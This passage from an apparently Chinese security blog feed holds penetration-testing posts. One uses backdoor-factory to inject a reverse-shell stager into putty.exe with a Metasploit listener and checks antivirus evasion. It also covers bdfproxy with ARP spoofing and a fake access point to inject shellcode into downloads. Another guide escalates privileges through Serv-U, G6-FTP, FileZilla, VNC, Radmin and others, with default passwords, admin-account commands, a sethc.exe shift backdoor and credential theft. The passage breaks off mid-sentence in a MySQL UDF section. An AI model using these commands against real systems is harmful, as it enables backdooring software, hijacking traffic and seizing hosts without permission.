src="https://img-blog.csdnimg.cn/20190525145320244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><p>-s SHELL, –shell=SHELL: 可以使用的有效负载。使用“show”来查看有效载荷</p><pre><code>  root@kali:~# backdoor-factory -f putty.exe -s show</code></pre></li></ul><p><img src="https://img-blog.csdnimg.cn/201905251453287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code>  root@kali:~# backdoor-factory -f `which nc` -s show</code></pre><p><img src="https://img-blog.csdnimg.cn/20190525145334950.png" alt="在这里插入图片描述"></p><ul><li><p>注入 putty.exe，报错</p><pre><code>  root@kali:~# backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 -o putty2.exe</code></pre></li></ul><p><img src="https://img-blog.csdnimg.cn/20190525145341279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code>  [!] Enter your selection: 2</code></pre><p><img src="https://img-blog.csdnimg.cn/20190525145347873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><p>显示未找到文件</p><pre><code>  Failed to read certificate file: /usr/share/backdoor-factory/certs/Verisign.cer  139701503748160:error:02001002:system library:fopen:No such file or directory:bss_file.c:175:fopen(&#39;/usr/share/backdoor-factory/certs/VerisignPrivateKey.pem&#39;,&#39;rb&#39;)  139701503748160:error:2006D080:BIO routines:BIO_new_file:no such file:bss_file.c:182:  139701503748160:error:02001002:system library:fopen:No such file or directory:bss_file.c:175:fopen(&#39;/usr/share/backdoor-factory/certs/Verisign.cer&#39;,&#39;rb&#39;)  139701503748160:error:2006D080:BIO routines:BIO_new_file:no such file:bss_file.c:182:  Failed  File putty5.exe is in the &#39;backdoored&#39; directory</code></pre></li><li><p>修复错误（备份并重命名）</p><pre><code>  root@kali:~# cat /usr/share/backdoor-factory/certs/  passFile.txt           signingCert.cer        signingPrivateKey.pem    root@kali:~# cd /usr/share/backdoor-factory/certs/  root@kali:/usr/share/backdoor-factory/certs# cp signingCert.cer signingCert.cer.bak  root@kali:/usr/share/backdoor-factory/certs# mv signingCert.cer Verisign.cer  root@kali:/usr/share/backdoor-factory/certs# cp signingPrivateKey.pem signingPrivateKey.pem.bak  root@kali:/usr/share/backdoor-factory/certs# mv signingPrivateKey.pem VerisignPrivateKey.pem  root@kali:~# backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 -o putty2.exe</code></pre></li></ul><p><img src="https://img-blog.csdnimg.cn/20190525145357145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><p>使用 msf 侦听</p><pre><code>  msf &gt; use exploit/multi/handler  msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp  msf exploit(multi/handler) &gt; set LHOST 10.10.10.131  msf exploit(multi/handler) &gt; set LPORT 4444  msf exploit(multi/handler) &gt; run</code></pre></li></ul><p><img src="https://img-blog.csdnimg.cn/20190525145405583.png" alt="在这里插入图片描述"></p><ul><li><p>windows 运行被注入 putty2.exe 程序，kali 反弹成功</p></li><li><p>免杀效果比较</p><p><a href="http://www.virscan.org/scan/" target="_blank" rel="noopener">查病毒网站：http://www.virscan.org/scan/</a></p></li></ul><pre><code>  backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 --output-file=putty3.exe  backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 --output-file=putty4.exe –J  backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 --output-file=putty5.exe -a</code></pre><ul><li><p>与 veil-evasion 集成</p><pre><code>  root@kali:~# veil-evasion  [menu&gt;&gt;]: list</code></pre></li></ul><p><img src="https://img-blog.csdnimg.cn/20190525145414174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="后门工具–Bdfproxy"><a href="#后门工具–Bdfproxy" class="headerlink" title="后门工具–Bdfproxy"></a>后门工具–Bdfproxy</h4><h4 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1.简介"></a>1.简介</h4><ul><li>Bdfproxy（mitmproxy）<ul><li>基于流量劫持（中间人攻击）动态注入 shellcode （ARP spoof、DNS spoof、Fake AP）</li></ul></li><li>步骤<ul><li>sysctl -w net.ipv4.ip_forward=1</li><li>iptables -t nat -A PREROUTING -p tcp –dport 80/443 -j REDIRECT –to-ports 8080</li><li>vi /etc/bdfproxy/bdfproxy.cfg<ul><li>proxyMode = transparent<br>修改侦听 IP 地址bdfproxy</li></ul></li></ul></li><li>arpspoof -i eth0 -t 1.1.1.2 1.1.1.1</li><li>启动 msf</li><li>流程<ul><li>mana 创建 Fack AP</li><li>badfproxy 代理注入代码</li><li>msf 侦听反弹 shell</li></ul></li></ul><h4 id="2-使用-1"><a href="#2-使用-1" class="headerlink" title="2.使用"></a>2.使用</h4><ul><li><p>修改 IP 转发</p><pre><code>root@kali:~# vim /etc/sysctl.conf net.ipv4.ip_forward=1</code></pre></li><li><p>修改 iptables</p><pre><code>root@kali:~# iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080root@kali:~# iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8080</code></pre></li><li><p>修改配置文件</p><pre><code>root@kali:~# vim /etc/bdfproxy/bdfproxy.cfgproxyMode = transparent  HOST = 10.10.10.131     #108行，117行，128行，替换所有的，有6个</code></pre></li><li><p>启动 bdfproxy</p><pre><code>root@kali:~# bdfproxy</code></pre></li><li><p>启动 msfconsole</p><pre><code>root@kali:~# msfconsole -r /root/bdfproxy_msf_resource.rcmsf exploit(multi/handler) &gt; jobs</code></pre></li></ul><ul><li><p>arp 欺骗</p><pre><code>root@kali:~# arpspoof -i eth0 -t 10.10.10.133 10.10.10.2</code></pre></li><li><p>靶机访问浏览器下载软件，并运行</p><pre><code>![](https://i.imgur.com/1qLFgFZ.png)</code></pre></li></ul><h4 id="3-无线流量劫持"><a href="#3-无线流量劫持" class="headerlink" title="3.无线流量劫持"></a>3.无线流量劫持</h4><ul><li><p>vi /etc/mana-toolkit/hostapd-mana.conf</p><ul><li>修改无线 SSID 名称</li></ul></li><li><p>./usr/share/mana-toolkit/run-mana/start-nat-simple.sh</p><ul><li>修改 wlan1 无线网卡适配器并启动</li><li>iptables -t nat -A PREROUTING -i $phy -p tcp –dport 80/443 -j REDIRECT –to-port 8080</li></ul></li><li><p>vi /etc/bdfproxy/bdfproxy.cfg</p><ul><li>proxyMode = transparent</li><li>修改侦听 IP 地址并启动 badfproxy</li></ul></li><li><p>启动 msf</p><ul><li>msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc</li></ul></li><li><p>补充内容</p><ul><li>全站 HTTPS 防注入（微软每个补丁都带码）</li><li>PE 文件证书签名可被清除</li><li>PE Header -&gt; Optional Header -&gt; Certificate Table(Address and size)<ul><li>全部用 0 覆盖</li><li>BDF 默认清除数字签名</li></ul></li></ul></li><li><p><a href="https://live.sysinternals.com/" target="_blank" rel="noopener">https://live.sysinternals.com/</a></p><ul><li>这是允许访问所有Sysinternals公用程序的文件共享。我们已经开发了这个功能来测试我们实用程序的替代分配机制。</li><li>这将允许您从任何连接到互联网的计算机运行这些工具，而无需导航到网页，下载并解压zip文件。</li></ul></li><li><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/" target="_blank" rel="noopener">Sysinternals网站</a></p><ul><li>Sysinternals网站由Mark Russinovich于1996年创建，主办他先进的系统实用程序和技术信息。无论您是IT专业人员还是开发人员，您都可以找到Sysinternals实用程序来帮助您管理，诊断和诊断Windows系统和应用程序。</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;渗透测试——免杀部分知识&quot;&gt;&lt;a href=&quot;#渗透测试——免杀部分知识&quot; class=&quot;headerlink&quot; title=&quot;渗透测试——免杀部分知识&quot;&gt;&lt;/a&gt;渗透测试——免杀部分知识&lt;/h2&gt;&lt;h4 id=&quot;1-恶意软件&quot;&gt;&lt;a href=&quot;#1-恶意软件&quot;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>msf后渗透部分学习</title>
    <link href="https://shu1l.github.io/2020/04/28/msf-hou-shen-tou-bu-fen-xue-xi/"/>
    <id>https://shu1l.github.io/2020/04/28/msf-hou-shen-tou-bu-fen-xue-xi/</id>
    <published>2020-04-28T04:36:04.000Z</published>
    <updated>2020-04-28T12:54:55.212Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>windows中常见提权方式总结(三)</title>
    <link href="https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-san/"/>
    <id>https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-san/</id>
    <published>2020-04-28T01:56:53.000Z</published>
    <updated>2020-04-29T05:42:21.580Z</updated>
    
    <content type="html"><![CDATA[<h2 id="提权之第三方软件提权总结"><a href="#提权之第三方软件提权总结" class="headerlink" title="提权之第三方软件提权总结"></a>提权之第三方软件提权总结</h2><h4 id="第三方软件serv-u提权"><a href="#第三方软件serv-u提权" class="headerlink" title="第三方软件serv-u提权"></a>第三方软件serv-u提权</h4><h5 id="serv-u简介"><a href="#serv-u简介" class="headerlink" title="serv-u简介"></a>serv-u简介</h5><ul><li>Serv-U FTP Server，是一种被广泛运用的FTP服务器端软件，支持3x/9x/ME/NT/2K等全Windows系列。可以设定多个FTP服务器、限定登录用户的权限、登录主目录及空间大小等</li><li>serv-u默认安装目录:C:\Program Files\rhinosoft.com\serv-U</li><li>serv-u密码文件：ServUDaemon.ini</li><li>端口号：默认端口是43958<br>ServUDaemon.ini中lccalsetuportNo=端口</li></ul><h5 id="FTP提权方法"><a href="#FTP提权方法" class="headerlink" title="FTP提权方法"></a>FTP提权方法</h5><p>1、有修改权限</p><p>2、无权限修改</p><p>3、serv-u ftp本地溢出权限提升(使用6.0以及以前版本)</p><p>4、serv-u ftp转发端口</p><h5 id="有修改权限"><a href="#有修改权限" class="headerlink" title="有修改权限"></a>有修改权限</h5><p>步骤如下：<br>1、判断是否安装serv-u<br>nmap扫端口确认<br>2、检查是否有可写权限<br>一般安装目录 c:\Program Files\Serv-u\SerUDaemon.ini<br>3、在serv-u中添加用户<br>在user4=添加一个系统用户</p><pre><code>[USER=quan|1]                                //用户名Password=                        //用户密码加密后的密文HomeDir=c:\ftp\quan             //目录RelPaths=3 TimeOut=600                      //超时时间设置Maintenance=System               //权限Access1=C:\|RWAMELCDP            //可访问的目录及权限Access2=d:\|RWAMELCDP            //可访问的目录及权限Access3=e:\|RWAMELCDP            //可访问的目录及权限SKEYValues=</code></pre><p>password=2位随机字符+md5(2位随机字符+123456)</p><p>4、连接目标FTP服务器</p><pre><code>ftp 目标IP地址 刚添加的用户密码</code></pre><p>5、利用ftp命令<code>quote site exec</code>添加用户加入administrators权限组</p><pre><code>quote site exec net user quan quan123 /addquote site exec net localgroup administrators quan /add</code></pre><h5 id="无修改权限"><a href="#无修改权限" class="headerlink" title="无修改权限"></a>无修改权限</h5><p>1、利用md5 直接去解密<br>2、默认用户名密码<br>账户：LocalAdministrator ，密码：#l@$ak#.lk;0@P<br>命令：<br>cmd /c net user quan quan123 /add &amp; net localgroup administrators quan /add<br>3、不是默认密码时<br>直接把SerUAdmin.exe 下载下来<br>用winhex打开查找LocalAdministrator（选择ANSI字符）进行查找密码</p><h5 id="serv-u-ftp本地溢出权限提升-使用6-0以及以前版本"><a href="#serv-u-ftp本地溢出权限提升-使用6-0以及以前版本" class="headerlink" title="serv-u ftp本地溢出权限提升(使用6.0以及以前版本)"></a>serv-u ftp本地溢出权限提升(使用6.0以及以前版本)</h5><p>步骤如下：<br>1、用Serv-U提权综合工具生成提权工具serv_u.exe<br>2、先上传 serv_u.exe 到一个盘符下<br>比如是d盘<br>3、执行命令</p><pre><code>d:\serv_u.exed:\serv_u.exe “net user quan quan123 /add”d:\serv_u.exe “net localgroup administrators quan /add” </code></pre><p>注意命令要有引号</p><h5 id="serv-u-ftp转发端口"><a href="#serv-u-ftp转发端口" class="headerlink" title="serv-u ftp转发端口"></a>serv-u ftp转发端口</h5><p>1、lcx端口转发<br>在目标Webshell上运行LCX命令</p><pre><code>lcx -slave yourIP 5000 127.0.0.1 43958</code></pre><p>在本机上运行</p><pre><code>lcx -listen 5000 21</code></pre><p>2、本机登陆Serv_U<br>打开本地的SERV_U 在IP上填入127.0.0.1<br>帐号写LocalAdministrator 密码#l@$ak#.lk;0@P</p><p>详情参考：<a href="https://blog.csdn.net/God_XiangYu/article/details/99692269" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99692269</a></p><p>这里就不写具体过程了</p><h4 id="第三方软件G6-FTP提权"><a href="#第三方软件G6-FTP提权" class="headerlink" title="第三方软件G6-FTP提权"></a>第三方软件G6-FTP提权</h4><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%B8%89%5CQQ%E6%88%AA%E5%9B%BE20200429095652.png" alt=""></p><h5 id="G6-FTP简介"><a href="#G6-FTP简介" class="headerlink" title="G6-FTP简介"></a>G6-FTP简介</h5><ul><li>G6 FTP Server 新一代的 FTP 服务器端软件，支持 RFC-959 标准并增强其中的某些功能，上传和下载都可以续传，实时查看运行状态，占用带宽，还有很多功能。</li><li>G6-FTP的默认端口为<code>8021</code>，只侦听在127.0.0.1的8021端口上，所以无法从外部直接访问，需要进行端口转发（使用lcx 工具（lcx 具有三个功能：监听、转发、端口转向））。</li></ul><h5 id="提权关键"><a href="#提权关键" class="headerlink" title="提权关键"></a>提权关键</h5><p>使用lcx时必须保证两个前提，肉鸡A和内网机C都能够访问到外网机B；listen监听的端口之前不能被其它程序占用。</p><h5 id="提取方法"><a href="#提取方法" class="headerlink" title="提取方法"></a>提取方法</h5><p>1、通过执行bat文件提权<br>2、通过映射bat文件提权</p><h5 id="通过执行bat文件提权"><a href="#通过执行bat文件提权" class="headerlink" title="通过执行bat文件提权"></a>通过执行bat文件提权</h5><p>步骤如下</p><ul><li><p>下载配置文件<code>Remote.ini</code>，将<code>administrator</code>管理密码解密<br>用cmd5 破解</p></li><li><p>查找该网站的可读可写目录，然后上传<code>cmd.exe</code>和<code>lcx.exe</code>到该目录下</p></li><li><p>利用<code>lcx</code>端口转发 默认只允许本机连接</p></li></ul><pre><code>lcx.exe -tran 8027 127.0.0.1 8021</code></pre><ul><li><p>以管理员用户登录服务端<br>转发成功后，通过<code>G6-FTP</code>软件进行连接，以管理员用户登入</p></li><li><p>创建FTP用户并进行权限设置</p></li><li><p>上传批处理文件<br><code>adduser.bat</code>中的文件内容为：即新建一个用户名为<code>quan</code>的用户，并且加入到管理员组中。</p></li></ul><pre><code>net user quan quan123 /addnet localgroup administrators quan /add</code></pre><ul><li><p>在G6-FTP软件中加入批处理命令<br>site commands-&gt; +<br>Command:ADDUSER<br>Excute:</p></li><li><p>普通用户登录ftp</p></li><li><p>执行所加入的批处理命令<br>执行命令<code>quote site adduser.bat</code></p></li></ul><h5 id="通过执行bat文件提权-1"><a href="#通过执行bat文件提权-1" class="headerlink" title="通过执行bat文件提权"></a>通过执行bat文件提权</h5><p>可用性较差<br>步骤如下<br>1、以非特权用户登录<br>2、通过添加FTP用户账户hhh<br>3、对FTP服务器添加新的site命令<br>4、新建a.bat文件</p><pre><code>net user quan quan123 /addnet localgroup administrators quan /add</code></pre><p>5、将a.bat文件映射到新建的site命令</p><p>6、获取system权限<br>以test用户登录ftp服务器，执行以下命令<br>ftp&gt;quote site a</p><h4 id="第三方软件FileZilla提权"><a href="#第三方软件FileZilla提权" class="headerlink" title="第三方软件FileZilla提权"></a>第三方软件FileZilla提权</h4><h5 id="FileZilla简介"><a href="#FileZilla简介" class="headerlink" title="FileZilla简介"></a>FileZilla简介</h5><ul><li>FileZilla是一个免费开源的FTP软件，分为客户端版本和服务器版本，具备所有的FTP软件功能。</li><li>FileZilla的默认端口为<code>14147</code>，只侦听在127.0.0.1的14147端口上，所以无法从外部直接访问，需要进行端口转发（使用lcx 工具（lcx 具有三个功能：监听、转发、端口转向））。默认安装目录下有两个敏感文件<code>filezillaserver.xml</code>（包含用户信息）和<code>filezillaserverinterface.xml</code>（包含管理信息）</li></ul><h5 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h5><p>1、下载这两个文件，拿到管理密码</p><p>2、查找该网站的可读可写目录，然后上传<code>cmd.exe</code>和<code>lcx.exe</code>到该目录下</p><p>3、利用<code>lcx</code>端口转发 默认只允许本机连接</p><pre><code>lcx.exe -tran 14148 127.0.0.1 14147</code></pre><p>4、以管理员用户远程登录服务端程序<br>转发成功后，通过<code>FileZilla</code>软件进行连接，以管理员用户登入<br>端口为14148，密码默认为空</p><p>5、创建ftp用户并进行权限设置<br>赋予C盘读写权限</p><p>6、用刚创建的用户通过FileZilla的客户端登录ftp</p><p>7、使用<code>cmd.exe</code>改名为<code>sethc.exe</code>替换<code>C:\Windows\System32\sethc.exe</code>生成shift后门</p><p>8、远程登录<code>3389</code>,按<code>5</code>次shift调出<code>cmd.exe</code></p><p>9、添加一个用户，并将其提升为管理员权限</p><pre><code>net user quan 123 /addnet localgroup administrator quan /add</code></pre><h5 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h5><p>​     FTP分为主动连接和被动连接，Filezilla的21端口是不能被转发出来的，将21端口转发出来以后，被动连接就会变成主动连接，Filezilla是不支持主动连接的。将21端口转发出来以后就会发生积极拒绝的情况。</p><p>​    2008系统权限比2003严格一点，导致系统文件是不能修改和删除重命名，这里是没有办法利用 。如果遇到不能提权的时候，可以使用如下几种提权思路。</p><h5 id="扩展知识："><a href="#扩展知识：" class="headerlink" title="扩展知识："></a>扩展知识：</h5><ol><li>通过FTP去篡改他桌面上快捷方式，路径指向给修改到我们的恶意程序。（比较被动）不推荐</li><li>上传利用到2008启动项 目录里，c:/users/administrator/appdata/roaming/microsoft/windows/start menu/programs/startup/</li><li>替换system系统服务程序，进行提权。</li></ol><h4 id="第三方软件FlashFXP提权"><a href="#第三方软件FlashFXP提权" class="headerlink" title="第三方软件FlashFXP提权"></a>第三方软件FlashFXP提权</h4><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%B8%89%5CQQ%E6%88%AA%E5%9B%BE20200429102747.png" alt=""></p><h5 id="1、FlashFXP简介"><a href="#1、FlashFXP简介" class="headerlink" title="1、FlashFXP简介"></a>1、FlashFXP简介</h5><ul><li>FlashFXP是一款功能强大的FXP/FTP软件，集成了其它优秀的FTP软件的优点，如CuteFTP的目录比较，支持彩色文字显示；如BpFTP支持多目录选择文件，暂存目录；又如LeapFTP的界面设计。</li></ul><h5 id="2、提权思路"><a href="#2、提权思路" class="headerlink" title="2、提权思路"></a>2、提权思路</h5><p>利用FlashFXP替换文件漏洞，可以读取管理员链接过的站点账号密码。</p><h5 id="3、提权步骤"><a href="#3、提权步骤" class="headerlink" title="3、提权步骤"></a>3、提权步骤</h5><p>（1）下载quick.dat这个文件<br>链接的账号密码都保存在<code>quick.dat</code><br>falshfxp默认安装目录：C:\Program Files\flashfxp</p><p>（2）本地覆盖<br>打开我们本机的FlashFTP把原先的文件替换掉</p><p>（3）获取网站管理密码<br>打开本机软件，查看历史记录，可以看到受害者主机quick.dat 文件里的服务器、用户名、密码等信息。<br>如果想要获取密码，可下载星号密码查看工具查看暗文</p><h4 id="第三方软件pcAnywhere提权"><a href="#第三方软件pcAnywhere提权" class="headerlink" title="第三方软件pcAnywhere提权"></a>第三方软件pcAnywhere提权</h4><h5 id="1、pcAnywhere简介"><a href="#1、pcAnywhere简介" class="headerlink" title="1、pcAnywhere简介"></a>1、pcAnywhere简介</h5><ul><li>PcAnywhere是一款远程控制软件，你可以将你的电脑当成主控端去控制远方另一台同样安装有pcANYWHERE的电脑（被控端），你可以使用被控端电脑上的程序或在主控端与被控端之间互传文件。</li><li>pcAnywher的默认端口为<code>5631、5632</code>。</li><li>pcAnywher的账户和密码保存在一个后缀为<code>.cif</code>的配置文件中,可能是PCA.serven.CIF。</li></ul><p><strong>2、提权步骤</strong></p><p>（1）访问pcAnywhere默认安装目录，查找<code>cif</code>文件并下载<br>默认路径： C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\Hosts</p><pre><code>dir *.cif/s</code></pre><p>（2）利用破解工具<code>pcAnywherePWD</code>对<code>cif</code>文件直接进行破解</p><p>（3）连接pcAnywhere服务端<br>拿到用户密码后使用客户端连接对pcAnywhere服务端进行连接，之后就和对本地计算机进行操作一样。</p><p>详情参考：<a href="https://blog.csdn.net/God_XiangYu/article/details/99699638" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99699638</a></p><h4 id="第三方软件VNC提权"><a href="#第三方软件VNC提权" class="headerlink" title="第三方软件VNC提权"></a>第三方软件VNC提权</h4><h5 id="VNC简介"><a href="#VNC简介" class="headerlink" title="VNC简介"></a>VNC简介</h5><p>VNC (Virtual Network Console)是虚拟网络控制台的缩写。它 是一款优秀的远程控制工具软件，由著名的 AT&amp;T 的欧洲研究实验室开发的。</p><h5 id="提权思路"><a href="#提权思路" class="headerlink" title="提权思路"></a>提权思路</h5><p>安装VNC后会<code>在注册表中保留VNC的密码</code>，通过WEBSHELL远程读取注册表中的密码信息并在本地破解VNC密码进行远程连接来达到提权目的。</p><h5 id="提权步骤-1"><a href="#提权步骤-1" class="headerlink" title="提权步骤"></a>提权步骤</h5><p><strong>1、通过读取注册表十进制数</strong><br>（1）RealVNC的注册表路径：</p><pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4\Password</code></pre><p>（2）UltraVNC的注册表路径：</p><pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\ORL\WinVNC3\Default\password</code></pre><p><strong>2、转换成十六进制数</strong><br>在线转换进制地址链接：<a href="https://www.toolfk.com/tool-convert-hexadecimal" target="_blank" rel="noopener">https://www.toolfk.com/tool-convert-hexadecimal</a></p><p><strong>3、破解十六进制数得到密码</strong><br>使用工具VNC4X进行破解<br>先在CMD输入<code>vncx4.exe -W</code>回车<br>然后将转换后的十六进制挨个输入，每输入一个都按一次回车</p><p><strong>4、使用获取到的账号密码连接vnc</strong><br>通过本地的VNC客户端，连接成功后远程操作实现提权</p><p>详情参考：<a href="https://blog.csdn.net/God_XiangYu/article/details/99711913" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99711913</a></p><h4 id="第三方软件Radmin提权"><a href="#第三方软件Radmin提权" class="headerlink" title="第三方软件Radmin提权"></a>第三方软件Radmin提权</h4><h5 id="Radmin简介"><a href="#Radmin简介" class="headerlink" title="Radmin简介"></a>Radmin简介</h5><ul><li>Radmin是平时在windows下用的比较多的一个远程管理工具。其具有支持多个连接和IP 过滤(即允许特定的IP控制远程机器)、个性化的档互传、远程关机、支持高分辨率模式、基于Windows NT的安全支持及密码保护以及提供日志文件支持等特性。</li><li>默认开放 <code>4899</code>端口</li><li>Radmin server2.X、Radmin server3.0都存在一个“致命”漏洞 —— radmin hash提权漏洞</li></ul><h5 id="提权思路-1"><a href="#提权思路-1" class="headerlink" title="提权思路"></a>提权思路</h5><p>老版本的Radmin会<code>在注册表中保留密码的Hash值</code>，通过WEBSHELL、远程挂马读取注册表中的密码Hash值并在本地破解密码进行远程连接来达到提权目的。</p><h5 id="提取步骤"><a href="#提取步骤" class="headerlink" title="提取步骤"></a>提取步骤</h5><p><strong>1、获取MD5Hash值</strong></p><pre><code>HKEY_LOCAL_MACHINESYSTEMRAdminv2.0ServerParametersParameter//默认密码注册表位置HKEY_LOCAL_MACHINESYSTEMRAdminv2.0ServerParametersPort //默认端口注册表位置</code></pre><p><strong>2、使用RadminHash进行登录</strong><br>在<code>Radmin-Hash</code>客户端输入RAdmin客户端的Hash值即可登录。<br>然后在Radmin-Hash客户端新建服务端，输入所要连接的<code>IP</code>或者扫描存活主机进行连接</p><p><strong>3、查看远程屏幕</strong></p><p>在Radmin客户端选择屏幕控制，输入Hash值即可查看远程主机屏幕。</p><p><strong>4、获取并破解密码</strong><br>用mimikatz解析用户密码，也可以通过上传getpw.exe文件获取用户的sam值，再通过LC5解密。</p><p><strong>5、登录远程桌面</strong></p><p>在本地打开远程桌面连接器，输入远端IP进行登录。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;提权之第三方软件提权总结&quot;&gt;&lt;a href=&quot;#提权之第三方软件提权总结&quot; class=&quot;headerlink&quot; title=&quot;提权之第三方软件提权总结&quot;&gt;&lt;/a&gt;提权之第三方软件提权总结&lt;/h2&gt;&lt;h4 id=&quot;第三方软件serv-u提权&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>windows渗透测试中常见提权方式总结(二)</title>
    <link href="https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/"/>
    <id>https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/</id>
    <published>2020-04-28T01:56:41.000Z</published>
    <updated>2020-04-29T05:42:43.706Z</updated>
    
    <content type="html"><![CDATA[<h2 id="渗透测试中常见提权方式总结（一）"><a href="#渗透测试中常见提权方式总结（一）" class="headerlink" title="渗透测试中常见提权方式总结（一）"></a>渗透测试中常见提权方式总结（一）</h2><h3 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3><h4 id="mysql之UDF提权"><a href="#mysql之UDF提权" class="headerlink" title="mysql之UDF提权"></a>mysql之UDF提权</h4><h4 id="原理分析："><a href="#原理分析：" class="headerlink" title="原理分析："></a>原理分析：</h4><p>​        <strong>UDF</strong>(user-defined function)是MySQL的一个拓展接口，也可称之为<strong>用户自定义函数</strong>，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。</p><p>​    <strong>动态链接库</strong>：是把程序代码中会使用的函数编译成机器码，不过是保存在.dll文件中。另外在编译时，不会把函数的机器码复制一份到可执行文件中。编译器只会在.exe的执行文件里，说明所要调用的函数放在哪一个*.dll文件。程序执行使用到这些函数时，操作系统会把dll文件中的函数拿出来给执行文件使用</p><p>​    <strong>udf是Mysql类提权的方式之一</strong>。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。</p><h4 id="提权常见手法："><a href="#提权常见手法：" class="headerlink" title="提权常见手法："></a>提权常见手法：</h4><p>一般来说使用udf提权的常规手法：</p><ul><li><p>上传大马webshell，利用大马中的UDF提权功能完成提权。</p></li><li><p>反弹shell，进而获取交互式tty shell，在shell中连接本地数据库，从而完成UDF提权。</p></li><li><p>利用FuckMySQL，本地执行命令。<a href="https://github.com/v5est0r/Python_FuckMySQL" target="_blank" rel="noopener">FuckMySQL</a>项目针对Windows平台。</p></li><li><p>利用SQLMAP中的-d参数连接远程数据库，自动上传so库完成UDF提权，从而获取os-shell</p></li><li><p>使用Navicat等数据库管理工具连接远程数据库，从而完成UDF提权。</p><p>其实这些手法的主要目的都是<strong>想方设法登陆数据库服务来执行SQL语句，进而获取到启动MySQL服务的root权限，</strong></p></li></ul><h4 id="提权的一些前提："><a href="#提权的一些前提：" class="headerlink" title="提权的一些前提："></a>提权的一些前提：</h4><p>利用udf提权有一些利用的先决条件：</p><ul><li>MySQL 数据库没有开启安全模式。</li><li>已知的数据库账号具有对 MySQL 数据库 insert 和 delete 的权限，最好是 root 最高权限。</li><li>shell 有写入到数据库安装目录的权限。</li></ul><p><strong>高版本mysql(mysql 